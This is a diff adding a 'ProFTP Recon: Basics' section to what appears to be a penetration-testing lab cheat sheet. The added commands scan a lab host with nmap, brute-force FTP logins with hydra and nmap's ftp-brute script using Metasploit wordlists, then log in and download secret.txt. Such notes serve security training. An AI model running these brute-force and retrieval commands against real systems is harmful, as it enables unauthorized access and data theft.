@@ -208,6 +208,19 @@ exploit
 enum4linux -r -u "admin" -p "password1" 192.212.251.3
 
 ```
+13)  ProFTP Recon: Basics
+
+```
+nmap -sV 192.235.127.3
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.235.127.3 -t 4 ftp
+echo "sysadmin" > users
+nmap --script ftp-brute --script-args userdb=/root/users -p 21 192.235.127.3
+ftp 192.235.127.3
+ls
+get secret.txt
+exit
+cat secret.txt
+```
 
 
 
